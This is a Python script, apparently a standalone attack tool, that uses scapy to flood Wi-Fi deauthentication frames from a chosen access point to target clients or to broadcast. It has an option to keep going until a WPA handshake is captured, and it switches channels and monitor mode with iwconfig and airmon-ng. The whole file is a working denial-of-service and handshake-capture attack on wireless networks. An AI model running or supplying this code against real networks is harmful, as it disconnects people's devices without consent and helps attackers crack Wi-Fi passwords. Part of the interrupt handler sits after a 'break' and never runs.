import optparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading
import os

parser = optparse.OptionParser()

parser.add_option('-i', '--interface', dest='INTERFACE', type=str, help='')
parser.add_option('-b', '--bssid', dest='BSSID', type=str, help='')
parser.add_option('-t', '--target', dest='TARGET', type=str, help='')
parser.add_option('-c', '--channel', dest='CHANNEL', type=str,  help='')
parser.add_option('--capturing-hs', dest='CAPTWS', type=str,  help='')
options, args = parser.parse_args()


class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[32m'
   LIGHTGREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   ORANGE = '\033[33m'
   END = '\033[0m'

TARGETS = []

def perform_deauth(bssid, CLIENT):
    print('[*] Press CTRL+C to quit') 
    if options.CAPTWS == "yes":
        os.chdir("wpa_capture/tmp")
    while True:
        for CLIENT in TARGETS:
            try:
                if options.CAPTWS == "yes":
                    if os.path.isfile("HANDSHAKE_CAPTURED.SUCCESS"):
                       exit()
                pckt = Dot11(addr1=CLIENT, addr2=bssid, addr3=bssid) / Dot11Deauth()
                cli_to_ap_pckt = None
                if CLIENT != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=CLIENT, addr3=bssid) / Dot11Deauth()
                send(pckt, verbose=False)
                print("["+color.CYAN+color.UNDERLINE+"DEAUTH"+color.END+"] Sending Deauth to "+color.CYAN+color.UNDERLINE+CLIENT+color.END+" from "+color.CYAN+color.UNDERLINE+bssid+color.END)
                if CLIENT != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt, verbose=False)  
            except KeyboardInterrupt:
                break
                monitor_quest = input("[?] Would you like to stop monitor mode? [Y/N]: ".format(INTERFACE))
            
                if monitor_quest == "Y" or monitor_quest == "y":
                    print("[*] Yes? Ok stopping monitor mode for you ...")
                    NEW_INTERFACE = INTERFACE.replace("mon", "")
                    monitor_quest = input(color.END+"[?] Is your normal adapter '{0}'? [Y/N]: ".format(NEW_INTERFACE))
                    if monitor_quest == "Y" or monitor_quest == "y":
                       os.system("airmon-ng stop {0} >/dev/null 2>&1 &".format(INTERFACE))
                       os.system("service network-manager start >/dev/null 2>&1 &")  
                pass       
                exit() 

if __name__ == "__main__":
    conf.iface = options.INTERFACE
    target_bssid = options.BSSID
    target_client = options.TARGET
    if "," in target_client:
        CLEANED = target_client.replace(",", " ")
        CLEANED = CLEANED.split()
        for CLIENT in CLEANED:
            TARGETS.append(CLIENT)
    else:
        TARGETS.append(target_client)
    channel = options.CHANNEL
    os.system("iwconfig {0} channel {1}".format(options.INTERFACE, channel))
    perform_deauth(target_bssid, target_client)

